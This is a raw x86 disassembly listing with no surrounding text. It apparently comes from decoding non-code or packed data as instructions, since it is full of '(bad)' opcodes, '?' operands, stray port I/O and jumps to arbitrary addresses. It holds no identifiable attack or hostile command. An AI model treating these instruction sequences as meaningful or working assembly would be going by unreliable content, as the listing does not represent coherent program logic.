  42d320:	or     BYTE PTR [eax-0x5e48aefc],cl
  42d326:	fwait
  42d327:	ret    
  42d328:	jno    0x42d2e6
  42d32a:	cmp    al,0xa4
  42d32c:	and    al,BYTE PTR [ebx-0x7501f9f5]
  42d332:	sub    eax,0xd8d0dbb4
  42d337:	inc    eax
  42d338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d339:	(bad)  
  42d33b:	mov    ah,0x64
  42d33d:	adc    DWORD PTR [edi],esi
  42d33f:	fiadd  WORD PTR [edx-0x305a5e42]
  42d345:	gs cdq 
  42d347:	(bad)  
  42d348:	dec    esp
  42d349:	xor    cl,BYTE PTR [eax]
  42d34b:	and    BYTE PTR [edi-0xf679c50],dh
  42d351:	(bad)  
  42d352:	cmp    eax,ebx
  42d354:	jbe    0x42d2eb
  42d356:	cs cli 
  42d358:	imul   ecx,DWORD PTR [ebp+eiz*8-0x42e2f070],0x24adcd74
  42d363:	pushf  
  42d364:	pop    es
  42d365:	xor    al,0xf
  42d367:	sub    eax,0xde5b54cd
  42d36c:	fs xor bl,dl
  42d36f:	clc    
  42d370:	shr    DWORD PTR [esi+0x269a6605],1
  42d376:	or     ah,BYTE PTR [ecx+0x0]
  42d379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d37a:	dec    edi
  42d37b:	rcr    BYTE PTR [esp+eiz*8],1
  42d37e:	or     eax,0x12fbe616
  42d383:	ins    BYTE PTR es:[edi],dx
  42d384:	leave  
  42d385:	cmp    ebx,ebp
  42d387:	mov    ds:0xa9ee3546,eax
  42d38c:	test   al,0xaf
  42d38e:	out    0xad,al
  42d390:	inc    esi
  42d391:	fwait
  42d392:	jecxz  0x42d315
  42d394:	xchg   esi,eax
  42d395:	xchg   ecx,eax
  42d396:	inc    esi
  42d397:	inc    esp
  42d398:	inc    ebx
  42d399:	dec    edx
  42d39a:	in     al,dx
  42d39b:	out    dx,al
  42d39c:	jns    0x42d369
  42d39e:	fsub   st,st(6)
  42d3a0:	cmp    ecx,edi
  42d3a2:	stos   BYTE PTR es:[edi],al
  42d3a3:	mov    WORD PTR [edi],?
  42d3a5:	mov    dh,0x63
  42d3a7:	or     edx,ebp
  42d3a9:	rcr    dh,cl
  42d3ab:	fnstcw WORD PTR [edx-0x47]
  42d3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3af:	bound  ebp,QWORD PTR [ecx]
  42d3b1:	pop    ds
  42d3b2:	sbb    eax,0xf07a182a
  42d3b7:	or     eax,0xfad0afd6
  42d3bc:	xchg   edx,eax
  42d3bd:	cmp    BYTE PTR [esi-0x14],dl
  42d3c0:	aad    0x0
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xa3d20781
  42d442:	push   ss
  42d443:	out    0x60,eax
  42d445:	fiadd  WORD PTR [ecx]
  42d447:	add    ch,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR [ecx+0x1d],bh
  42d44e:	mov    bh,0xa0
  42d450:	pop    ebp
  42d451:	push   edx
  42d452:	aas    
  42d453:	xor    ebp,DWORD PTR [edi-0x7620adfc]
  42d459:	shr    DWORD PTR [ebp+0x5e],1
  42d45c:	xor    esp,edx
  42d45e:	je     0x42d4c5
  42d460:	ja     0x42d4a0
  42d462:	ficom  DWORD PTR [eax]
  42d464:	shr    BYTE PTR [ebp+0x5e3b282d],cl
  42d46a:	or     DWORD PTR ds:0x62a21988,ebp
  42d470:	in     al,dx
  42d471:	clc    
  42d472:	mov    al,ds:0x487fc457
  42d477:	(bad)  ds:0x826c11aa
  42d47d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42d47f:	adc    eax,0x91d838ae
  42d484:	stc    
  42d485:	adc    al,cl
  42d487:	mov    eax,ds:0x7e4bf3ed
  42d48c:	sbb    eax,0xfbb32030
  42d491:	push   ebp
  42d492:	sbb    BYTE PTR [ebp-0x61],ch
  42d495:	retf   
  42d496:	dec    esi
  42d497:	pushf  
  42d498:	pop    edx
  42d499:	pop    ecx
  42d49a:	inc    ebx
  42d49b:	sbb    bh,BYTE PTR [esi+0x3aa48427]
  42d4a1:	es sbb al,0xb2
  42d4a4:	mov    al,0x55
  42d4a6:	jb     0x42d4f5
  42d4a8:	outs   dx,BYTE PTR ds:[esi]
  42d4a9:	inc    ebp
  42d4aa:	mov    edi,0x90b785a8
  42d4af:	bound  edx,QWORD PTR [ebp-0x1f]
  42d4b2:	es aas 
  42d4b4:	or     bh,BYTE PTR [eax-0x29]
  42d4b7:	xor    cl,BYTE PTR [eax+0x4cf2cfde]
  42d4bd:	mov    bh,0xc6
  42d4bf:	(bad)  
  42d4c0:	push   ebx
  42d4c1:	cmp    bl,dl
  42d4c3:	je     0x42d51b
  42d4c5:	push   eax
  42d4c6:	pop    edi
  42d4c7:	mov    dh,0xc8
  42d4c9:	imul   esi,DWORD PTR [esp+ebp*2-0x2d],0x4e1e6427
  42d4d1:	pop    eax
  42d4d2:	cmp    eax,0xea25bd59
  42d4d7:	pop    edx
  42d4d8:	test   cl,0x55
  42d4db:	in     eax,dx
  42d4dc:	(bad)  
  42d4dd:	imul   ebp,DWORD PTR [edx+0x4ac2655a],0x28
  42d4e4:	test   BYTE PTR [edi],bh
  42d4e6:	adc    bh,BYTE PTR [edi+ecx*1]
  42d4e9:	inc    ebx
  42d4ea:	add    BYTE PTR [ecx-0x64aed4e8],bl
  42d4f0:	outs   dx,DWORD PTR ds:[esi]
  42d4f1:	and    BYTE PTR ds:0xddd2874a,dh
  42d4f7:	lock mov ah,0x61
  42d4fa:	mov    eax,0xf36c2a18
  42d4ff:	bound  esp,QWORD PTR [ebp-0x71275115]
  42d505:	sti    
  42d506:	and    dl,BYTE PTR [ebp-0x16]
  42d509:	repnz test al,0x75
  42d50c:	jl     0x42d52c
  42d50e:	adc    al,al
  42d510:	jae    0x42d570
  42d512:	push   ss
  42d513:	ss out 0x75,al
  42d516:	ins    BYTE PTR es:[edi],dx
  42d517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d518:	cld    
  42d519:	inc    esi
  42d51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d51b:	mov    bl,0x18
  42d51d:	xor    al,0x9d
  42d51f:	hlt    
  42d520:	mov    DWORD PTR ds:0x967ecc5c,eax
  42d526:	sub    cl,BYTE PTR [edx+0x65]
  42d529:	cmp    edi,DWORD PTR [esi+0xda227bf]
  42d52f:	adc    eax,DWORD PTR [edx-0x1a21daa0]
  42d535:	je     0x42d574
  42d537:	adc    WORD PTR [ecx],si
  42d53a:	add    bl,bh
  42d53c:	push   cs
  42d53d:	jecxz  0x42d4c3
  42d53f:	mov    ebx,0x3f
	...
  42d5b4:	pop    ebp
  42d5b5:	dec    eax
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	and    DWORD PTR [esi-0x3b],eax
  42d5c3:	pop    edi
  42d5c4:	push   ebp
  42d5c5:	fild   WORD PTR [ecx]
  42d5c7:	add    ch,dh
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [esi-0x5],cl
  42d5ce:	jb     0x42d5fd
  42d5d0:	add    al,0x9b
  42d5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5d3:	xlat   BYTE PTR ds:[ebx]
  42d5d4:	in     al,dx
  42d5d5:	(bad)  
  42d5d6:	retf   
  42d5d7:	test   al,0x25
  42d5d9:	loope  0x42d649
  42d5db:	cld    
  42d5dc:	mov    esi,0x1b87c1d2
  42d5e1:	call   DWORD PTR [ebx-0x35d265d0]
  42d5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5e8:	jle    0x42d580
  42d5ea:	xor    eax,0x310b9f40
  42d5ef:	outs   dx,BYTE PTR ds:[esi]
  42d5f0:	xchg   DWORD PTR [edx],edx
  42d5f2:	test   eax,0xcff7ffb0
  42d5f7:	(bad)  
  42d5f8:	mov    edx,0x80ac1bf9
  42d5fd:	or     eax,0xa4ad3467
  42d602:	test   BYTE PTR [ebx-0x73],0x4c
  42d606:	jg     0x42d652
  42d608:	add    BYTE PTR [esi-0x8bcca01],dh
  42d60e:	and    ch,ch
  42d610:	bound  ebp,QWORD PTR [ebp+0x6bda0e81]
  42d616:	push   ebx
  42d617:	xor    al,0xf2
  42d619:	dec    edx
  42d61a:	imul   edx,DWORD PTR [esi+0x59],0xf2639d84
  42d621:	xchg   BYTE PTR [esi-0x728a6617],al
  42d627:	ins    BYTE PTR es:[edi],dx
  42d628:	pop    edx
  42d629:	mov    ds:0x68fb1167,al
  42d62e:	imul   ebp,DWORD PTR [ebp+0x78],0xa1e4f122
  42d635:	sbb    al,0x25
  42d637:	jecxz  0x42d69f
  42d639:	xor    ecx,esi
  42d63b:	mov    dh,BYTE PTR [ebp+edx*1-0x23]
  42d63f:	pop    edi
  42d640:	jp     0x42d5ca
  42d642:	jne    0x42d668
  42d644:	fst    QWORD PTR [edx*1+0x272d1ddc]
  42d64b:	jge    0x42d673
  42d64d:	inc    ebx
  42d64e:	mov    edi,0x72ac1f4e
  42d653:	mov    bh,0xda
  42d655:	xchg   edi,eax
  42d656:	xor    eax,0xe39c719b
  42d65b:	cdq    
  42d65c:	sahf   
  42d65d:	es enter 0x5eed,0xe5
  42d662:	cmp    al,0xf6
  42d664:	shr    DWORD PTR [edi+0x7fe5af50],0x91
  42d66b:	(bad)  
  42d66c:	cmp    DWORD PTR [ebp+eax*1+0x7f],ebp
  42d670:	(bad)  
  42d671:	xchg   esp,eax
  42d672:	aam    0x45
  42d674:	mov    ch,0x30
  42d676:	jns    0x42d61a
  42d678:	dec    esp
  42d679:	aas    
  42d67a:	push   0x5b
  42d67c:	ret    0x1272
  42d67f:	jge    0x42d6b7
  42d681:	arpl   WORD PTR [edx-0x32],si
  42d684:	pop    esi
  42d685:	in     al,dx
  42d686:	arpl   WORD PTR [ebx+0x5fa770ea],bp
  42d68c:	mov    ds,WORD PTR [edx+0x54a75aff]
  42d692:	jl     0x42d6c5
  42d694:	lahf   
  42d695:	sbb    eax,0xd2e49337
  42d69a:	xor    ebp,DWORD PTR [edx-0x7a]
  42d69d:	mov    dh,0x78
  42d69f:	and    ebx,0x2f0ef447
  42d6a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6a6:	adc    DWORD PTR [esi+esi*1],esp
  42d6a9:	pop    ds
  42d6aa:	mov    eax,ds:0x6bef4d55
  42d6af:	stos   DWORD PTR es:[edi],eax
  42d6b0:	mov    BYTE PTR [ebx-0x46],ah
  42d6b3:	fst    QWORD PTR [bp+di-0x3c]
  42d6b7:	ret    
  42d6b8:	enter  0x4197,0xd4
  42d6bc:	pop    ecx
  42d6bd:	inc    edx
  42d6be:	stc    
  42d6bf:	xchg   edi,eax
  42d6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42d731:	add    BYTE PTR [eax],al
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	xor    BYTE PTR [ebp+ebp*2-0x5b],dh
  42d744:	dec    edx
  42d745:	loopne 0x42d748
  42d747:	add    ch,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    BYTE PTR [edi],cl
  42d74d:	and    ecx,edx
  42d74f:	out    dx,eax
  42d750:	shl    BYTE PTR [ecx+0x53c93e01],1
  42d756:	or     al,0x91
  42d758:	out    dx,al
  42d759:	add    dl,BYTE PTR [edi+0x757d7af7]
  42d75f:	sub    al,0xcd
  42d761:	or     BYTE PTR [edi-0x2b74dd9c],al
  42d767:	call   0x5e29:0x3efa739d
  42d76e:	and    DWORD PTR [edi+0x31],ecx
  42d771:	xor    BYTE PTR [eax+edx*4-0x4ebf2cc],cl
  42d778:	jbe    0x42d760
  42d77a:	pop    edx
  42d77b:	into   
  42d77c:	inc    esi
  42d77d:	push   ss
  42d77e:	iret   
  42d77f:	adc    eax,0x9222450d
  42d784:	stos   DWORD PTR es:[edi],eax
  42d785:	push   esp
  42d786:	sub    DWORD PTR [ebx+0x2a],esi
  42d789:	adc    DWORD PTR [eax],0x105c6156
  42d78f:	inc    ebx
  42d790:	push   es
  42d791:	cmc    
  42d792:	push   eax
  42d793:	mov    edi,0xc38f2ffc
  42d798:	shl    DWORD PTR ds:0x43cea834,cl
  42d79e:	shl    DWORD PTR [eax-0x301b510e],1
  42d7a4:	and    ecx,DWORD PTR [esi+0x78]
  42d7a7:	push   edx
  42d7a8:	xchg   BYTE PTR [ebx+0x31],ch
  42d7ab:	sbb    DWORD PTR [ebx+eax*4+0x19],0xd93322ec
  42d7b3:	mov    DWORD PTR [ecx+0x4c7554ba],0xeb37b15c
  42d7bd:	ror    DWORD PTR [ebx-0x2],0xaf
  42d7c1:	push   ds
  42d7c2:	cmp    BYTE PTR ds:0x578e201f,dh
  42d7c8:	xchg   esi,eax
  42d7c9:	fwait
  42d7ca:	jg     0x42d77d
  42d7cc:	push   esp
  42d7cd:	push   esi
  42d7ce:	mov    ch,0x85
  42d7d0:	dec    ecx
  42d7d1:	jne    0x42d772
  42d7d3:	dec    edi
  42d7d4:	inc    esi
  42d7d5:	inc    esp
  42d7d6:	dec    edx
  42d7d7:	or     eax,0xd4f32ef3
  42d7dc:	sub    ebx,0x84e7f8d9
  42d7e2:	mov    cl,0xa8
  42d7e4:	or     eax,DWORD PTR [esi+esi*4]
  42d7e7:	sub    BYTE PTR [ecx+0x1e],0x41
  42d7eb:	mov    eax,ds:0x18bf4c88
  42d7f0:	sbb    edx,DWORD PTR [edx-0x4f6f2e5a]
  42d7f6:	and    BYTE PTR [ecx],bh
  42d7f8:	and    ecx,DWORD PTR [ebx+0x1aa18ab7]
  42d7fe:	xchg   ebx,eax
  42d7ff:	dec    ax
  42d801:	sbb    DWORD PTR [ebx],esi
  42d803:	mov    ds:0x32f2d359,al
  42d808:	rcl    bl,cl
  42d80a:	mov    eax,ds:0x2bc5c064
  42d80f:	sbb    ecx,edx
  42d811:	push   cs
  42d812:	jmp    0x42d819
  42d814:	retf   
  42d815:	sub    dl,bl
  42d817:	jnp    0x42d7d0
  42d819:	shr    DWORD PTR [ecx+0x7d],cl
  42d81c:	push   edi
  42d81d:	cmp    esp,eax
  42d81f:	out    0x9b,eax
  42d821:	push   0xffffff8a
  42d823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d824:	pop    ebp
  42d825:	push   ebp
  42d826:	and    BYTE PTR [esi],cl
  42d828:	addr16 xchg eax,eax
  42d82b:	jmp    0x7d92a143
  42d830:	xchg   esi,eax
  42d831:	xor    DWORD PTR [esp+eiz*2+0x4c],ebx
  42d835:	icebp  
  42d836:	scas   al,BYTE PTR es:[edi]
  42d837:	test   esp,0x63aa44bb
  42d83d:	cmp    ebx,DWORD PTR [ebx+0xcf9c]
	...
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x7edcc254
  42d8c1:	jmp    DWORD PTR [ebx-0x6b]
  42d8c4:	aas    
  42d8c5:	loope  0x42d8c8
  42d8c7:	add    ch,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [ecx-0x62],dl
  42d8ce:	push   ecx
  42d8cf:	ins    BYTE PTR es:[edi],dx
  42d8d0:	mov    bl,0xe3
  42d8d2:	dec    eax
  42d8d3:	adc    eax,0x247f9806
  42d8d8:	in     eax,dx
  42d8d9:	jmp    0x42d938
  42d8db:	mov    eax,ds:0x4015327e
  42d8e0:	repz es cmp eax,0x3fa81af2
  42d8e7:	outs   dx,BYTE PTR ds:[esi]
  42d8e8:	daa    
  42d8e9:	mov    ah,0x1b
  42d8eb:	ins    BYTE PTR es:[edi],dx
  42d8ec:	adc    dh,BYTE PTR [eax-0x243131e0]
  42d8f2:	repz push cs
  42d8f4:	out    dx,eax
  42d8f5:	cmp    edx,DWORD PTR [eax]
  42d8f7:	inc    ebx
  42d8f8:	or     dl,dl
  42d8fa:	cmp    DWORD PTR [esi-0x62],edi
  42d8fd:	addr16 mov ch,0x67
  42d900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d901:	dec    ebx
  42d902:	adc    bl,ch
  42d904:	sbb    DWORD PTR [eax+0x4],0xffffff98
  42d908:	adc    ah,BYTE PTR [ecx+0x37dd665e]
  42d90e:	jo     0x42d8b1
  42d910:	jmp    0x42d8a5
  42d912:	jmp    0xaaf64221
  42d917:	sahf   
  42d918:	ret    0xef1d
  42d91b:	int    0x63
  42d91d:	jmp    0xe7ec1bb6
  42d922:	jge    0x42d8c2
  42d924:	pop    esp
  42d925:	lock jne 0x42d9a0
  42d928:	loope  0x42d91b
  42d92a:	outs   dx,BYTE PTR ds:[esi]
  42d92b:	push   esp
  42d92c:	je     0x42d8c4
  42d92e:	hlt    
  42d92f:	pop    edi
  42d930:	xor    eax,0x6e5d263c
  42d935:	mov    edx,0xa01245e0
  42d93a:	xlat   BYTE PTR ds:[ebx]
  42d93b:	cmp    al,BYTE PTR [esp+eiz*2-0x581d08c]
  42d942:	xchg   ebp,eax
  42d943:	mov    ?,WORD PTR [edi+0x5592199d]
  42d949:	push   es
  42d94a:	div    ebx
  42d94c:	leave  
  42d94d:	pop    es
  42d94e:	mov    al,ds:0x6381c928
  42d953:	test   al,0x1f
  42d955:	xchg   esi,eax
  42d956:	lock cli 
  42d958:	and    al,BYTE PTR [edi-0x687d9a57]
  42d95e:	jp     0x42d917
  42d960:	xor    eax,0x6816ba2d
  42d965:	push   ebp
  42d966:	xchg   edi,eax
  42d967:	adc    al,dl
  42d969:	(bad)  
  42d96a:	pop    esp
  42d96b:	mov    WORD PTR [eax+0x30ab69e5],?
  42d971:	pop    ebp
  42d972:	push   0xd0550fca
  42d977:	loop   0x42d925
  42d979:	out    dx,eax
  42d97a:	loop   0x42d9df
  42d97c:	loop   0x42d92a
  42d97e:	inc    edx
  42d97f:	mov    dh,0xda
  42d981:	sub    al,0x3b
  42d983:	add    BYTE PTR [ebp+0x36],0x45
  42d987:	xchg   edx,eax
  42d988:	(bad)  
  42d989:	sahf   
  42d98a:	outs   dx,DWORD PTR ds:[esi]
  42d98b:	enter  0xdb5b,0xf7
  42d98f:	add    al,0xf
  42d991:	imul   esi,DWORD PTR [edx+0xe687809],0xffffffec
  42d998:	outs   dx,BYTE PTR ds:[esi]
  42d999:	int3   
  42d99a:	pop    eax
  42d99b:	pusha  
  42d99c:	mov    ds:0x5884fe63,al
  42d9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d9a2:	sub    al,0xea
  42d9a4:	or     ch,BYTE PTR [edx]
  42d9a6:	(bad)  
  42d9a7:	jmp    0x42d9bd
  42d9a9:	clc    
  42d9aa:	and    al,0xa1
  42d9ac:	(bad)  
  42d9ad:	mov    edi,0xa17438ae
  42d9b2:	inc    edi
  42d9b3:	arpl   WORD PTR [esi+ebx*4+0x1d],dx
  42d9b7:	push   edi
  42d9b8:	loop   0x42d973
  42d9ba:	repnz fist DWORD PTR [edi+0x701cd8bc]
	...
  42da31:	add    BYTE PTR [eax],al
  42da33:	add    BYTE PTR [edi-0x2be7726],ah
  42da39:	push   ebx
  42da3a:	out    dx,eax
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	lahf   
  42da41:	nop    eax
  42da44:	xor    al,0xe2
  42da46:	add    DWORD PTR [eax],eax
  42da48:	cmc    
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [esi],dh
  42da4d:	fnstenv [ebp+0x58ff18e1]
  42da53:	dec    esi
  42da54:	cli    
  42da55:	sti    
  42da56:	pop    eax
  42da57:	iret   
  42da58:	dec    ebx
  42da59:	fs repnz xchg esi,eax
  42da5c:	or     bh,dh
  42da5e:	and    al,0x56
  42da60:	jp     0x42dabf
  42da62:	jne    0x42da70
  42da64:	jo     0x42dacf
  42da66:	icebp  
  42da67:	cli    
  42da68:	shl    BYTE PTR [ecx],cl
  42da6a:	or     BYTE PTR [edi-0x5f36f91b],cl
  42da70:	test   al,0xb0
  42da72:	aad    0x8b
  42da74:	imul   eax,DWORD PTR [edx],0x5d
  42da77:	mov    edi,0x9a742a57
  42da7c:	(bad)  
  42da7d:	pop    esi
  42da7e:	aam    0x5a
  42da80:	pop    ds
  42da81:	jmp    0x42da4c
  42da83:	xchg   esi,eax
  42da84:	imul   ebx,DWORD PTR [edi+0x48c200de],0xaa1ae8d5
  42da8e:	hlt    
  42da8f:	inc    ebx
  42da90:	xchg   esi,eax
  42da91:	adc    BYTE PTR [eax+0x7d],dl
  42da94:	sbb    edi,DWORD PTR [ebx+0x228af914]
  42da9a:	mov    edi,0x1d8d0600
  42da9f:	cmp    al,0xe1
  42daa1:	mov    al,BYTE PTR [eax+0x10]
  42daa4:	stos   DWORD PTR es:[edi],eax
  42daa5:	add    al,0x83
  42daa7:	cmp    BYTE PTR [ebx],bh
  42daa9:	mov    edx,0xe10e0223
  42daae:	lds    ebp,FWORD PTR ds:0xb72d272a
  42dab4:	das    
  42dab5:	jns    0x42da77
  42dab7:	push   eax
  42dab8:	mov    eax,0x55bb5922
  42dabd:	mov    edi,0xd0aa82a0
  42dac2:	push   0x86a5c245
  42dac7:	std    
  42dac8:	fs pop esi
  42daca:	je     0x42dae9
  42dacc:	shl    esp,cl
  42dace:	cmp    BYTE PTR [ecx-0x5bc56308],0xfd
  42dad5:	loope  0x42da88
  42dad7:	sbb    eax,0x5e476996
  42dadc:	pusha  
  42dadd:	sub    al,0x3a
  42dadf:	or     ebp,DWORD PTR [esi]
  42dae1:	cdq    
  42dae2:	leave  
  42dae3:	xor    al,cl
  42dae5:	js     0x42da94
  42dae7:	ins    BYTE PTR es:[edi],dx
  42dae8:	lea    ebx,[esi+0x14]
  42daeb:	inc    edi
  42daec:	mov    edx,0x97a6e6a3
  42daf1:	sub    ah,BYTE PTR [ecx+0x37b82d4]
  42daf7:	test   eax,0xa487bc41
  42dafc:	imul   esp,DWORD PTR [ebx],0x66
  42daff:	dec    ebp
  42db00:	mov    ebp,0x64f8d91c
  42db05:	xchg   ebp,eax
  42db06:	(bad)  
  42db07:	xor    bl,BYTE PTR [esi+0x15412647]
  42db0d:	push   edx
  42db0e:	int3   
  42db0f:	push   ss
  42db10:	rcl    BYTE PTR [edi-0x4e1a33f3],0x86
  42db17:	xchg   edi,eax
  42db18:	mov    edi,0x699c9855
  42db1d:	mov    edx,0xa8276924
  42db22:	mov    ds:0x8dcab0cd,al
  42db27:	sar    DWORD PTR [edi],cl
  42db29:	mov    al,0xc9
  42db2b:	or     esi,DWORD PTR [ecx-0x3e]
  42db2e:	mov    ebp,0x124c55f
  42db33:	ss fs jae 0x42db02
  42db37:	je     0x42db80
  42db39:	xor    eax,0x7fa3132
  42db3e:	and    DWORD PTR [edx],esi
  42db40:	in     eax,dx
	...
  42dbb1:	add    BYTE PTR [eax],al
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0xa9967537,al
  42dbc3:	jnp    0x42dbee
  42dbc5:	jecxz  0x42dbc8
  42dbc7:	add    ch,dh
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    ah,cl
  42dbcd:	mov    ah,0xe2
  42dbcf:	jmp    FWORD PTR [edi]
  42dbd1:	aad    0x10
  42dbd3:	pop    edx
  42dbd4:	and    ah,al
  42dbd6:	xchg   esp,eax
  42dbd7:	shl    ecx,1
  42dbd9:	das    
  42dbda:	pop    edx
  42dbdb:	adc    WORD PTR [edx],cx
  42dbde:	aam    0x93
  42dbe0:	rcl    DWORD PTR [esi+eiz*2-0x73],0x66
  42dbe5:	sub    dl,BYTE PTR [edx-0x5f]
  42dbe8:	(bad)  
  42dbe9:	fst    DWORD PTR [ebx+0x7d051b7e]
  42dbef:	jae    0x42dc0b
  42dbf1:	mov    dl,0xdd
  42dbf3:	push   0x3d
  42dbf5:	mov    ds:0x37ce3960,eax
  42dbfa:	xor    esi,DWORD PTR [edx]
  42dbfc:	stos   BYTE PTR es:[edi],al
  42dbfd:	and    DWORD PTR [edi+esi*1-0x57],esi
  42dc01:	jl     0x42dc72
  42dc03:	push   DWORD PTR [edx+0x13]
  42dc06:	dec    esp
  42dc07:	push   eax
  42dc08:	push   0xffffff85
  42dc0a:	xchg   BYTE PTR [ecx-0x56],dh
  42dc0d:	lds    edx,FWORD PTR [esi]
  42dc0f:	sub    BYTE PTR [eax+0x11d720c8],dl
  42dc15:	outs   dx,BYTE PTR ds:[esi]
  42dc16:	mov    al,ds:0x5700180b
  42dc1b:	ficom  DWORD PTR [ebp+esi*8+0x1c3d70a9]
  42dc22:	cmp    ebp,edx
  42dc24:	fadd   DWORD PTR [edx+0x0]
  42dc27:	cli    
  42dc28:	mov    eax,ds:0x7c44a1d8
  42dc2d:	lahf   
  42dc2e:	jp     0x42dc97
  42dc30:	(bad)  
  42dc31:	arpl   bp,di
  42dc33:	sub    cl,cl
  42dc35:	jnp    0x42dc17
  42dc37:	loop   0x42dc1c
  42dc39:	push   ds
  42dc3a:	popf   
  42dc3b:	imul   edx,edi,0xffffffec
  42dc3e:	jg     0x42dc6f
  42dc40:	or     al,BYTE PTR [edi]
  42dc42:	dec    edi
  42dc43:	clc    
  42dc44:	stos   DWORD PTR es:[edi],eax
  42dc45:	xchg   edx,edx
  42dc47:	loop   0x42dcbb
  42dc49:	inc    ebp
  42dc4a:	sahf   
  42dc4b:	(bad)  
  42dc4c:	in     al,dx
  42dc4d:	jns    0x42dc24
  42dc4f:	arpl   WORD PTR [ebx],di
  42dc51:	lea    ecx,[ebx+0x3f]
  42dc54:	adc    DWORD PTR [esi+0x420c31ee],ebx
  42dc5a:	fsubr  QWORD PTR [ecx+0xa67fc35]
  42dc60:	imul   edx,DWORD PTR es:[edi],0xed6a6bf6
  42dc67:	jl     0x42dbf8
  42dc69:	jmp    0x80b1:0x1e9b1f43
  42dc70:	je     0x42dc4b
  42dc72:	jne    0x42dc0f
  42dc74:	enter  0xb841,0x5c
  42dc78:	dec    edi
  42dc79:	ja     0x42dc44
  42dc7b:	jne    0x42dc53
  42dc7d:	imul   edx,ecx,0xffffffd2
  42dc80:	test   DWORD PTR [ebx-0x39],eax
  42dc83:	and    ah,BYTE PTR [edx]
  42dc85:	xor    edi,DWORD PTR [eax]
  42dc87:	sti    
  42dc88:	inc    edi
  42dc89:	mov    al,0xca
  42dc8b:	pop    edi
  42dc8c:	retf   
  42dc8d:	or     al,0xb1
  42dc8f:	rcl    bh,0x93
  42dc92:	dec    edx
  42dc93:	lds    edi,FWORD PTR [ecx]
  42dc95:	leave  
  42dc96:	rcl    BYTE PTR [ebx-0x79],cl
  42dc99:	ja     0x42dca9
  42dc9b:	adc    BYTE PTR [eax-0x7f],dl
  42dc9e:	retf   0xaffd
  42dca1:	retf   
  42dca2:	mov    ds:0xe4ca745,al
  42dca7:	retf   0x9e3
  42dcaa:	xor    bh,BYTE PTR [esi+0x40abaf3a]
  42dcb0:	xor    BYTE PTR [edi+0x63],dh
  42dcb3:	ja     0x42dc93
  42dcb5:	mov    ah,0xa2
  42dcb7:	and    bh,BYTE PTR ds:0x6c67de85
  42dcbd:	pop    ebp
  42dcbe:	mov    ebp,0xb2ef
	...
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx+0x11498d8]
  42dd44:	push   ds
  42dd45:	in     al,0x1
  42dd47:	add    ch,dh
  42dd49:	add    BYTE PTR [eax],al
  42dd4b:	add    BYTE PTR [esi+0x3e6938a],cl
  42dd51:	mov    ecx,DWORD PTR [eax]
  42dd53:	fdivr  DWORD PTR [edi]
  42dd55:	ins    BYTE PTR es:[edi],dx
  42dd56:	mov    al,ds:0x2400e5f4
  42dd5b:	aad    0x6a
  42dd5d:	xchg   edx,eax
  42dd5e:	call   DWORD PTR [esi]
  42dd60:	in     eax,dx
  42dd61:	inc    ebx
  42dd62:	popa   
  42dd63:	cmp    cl,BYTE PTR [eax]
  42dd65:	jns    0x42dd14
  42dd67:	sub    dh,cl
  42dd69:	frstor [esi]
  42dd6b:	(bad)  
  42dd6c:	sub    BYTE PTR [ebp+0x574c0491],bh
  42dd72:	(bad)  
  42dd73:	sub    al,0x6e
  42dd75:	sub    DWORD PTR [esp+ebp*1],esp
  42dd78:	ret    0x4380
  42dd7b:	fs into 
  42dd7d:	in     eax,0x38
  42dd7f:	mov    ecx,0x7fcb89fb
  42dd84:	xor    al,BYTE PTR [ebx+0x32]
  42dd87:	jns    0x42ddc4
  42dd89:	rcr    BYTE PTR [ecx],cl
  42dd8b:	ror    esi,0x2
  42dd8e:	lea    ebx,es:[esp+esi*4]
  42dd92:	dec    esi
  42dd93:	retf   
  42dd94:	ret    0x8ac6
  42dd97:	jbe    0x42ddf3
  42dd99:	dec    esi
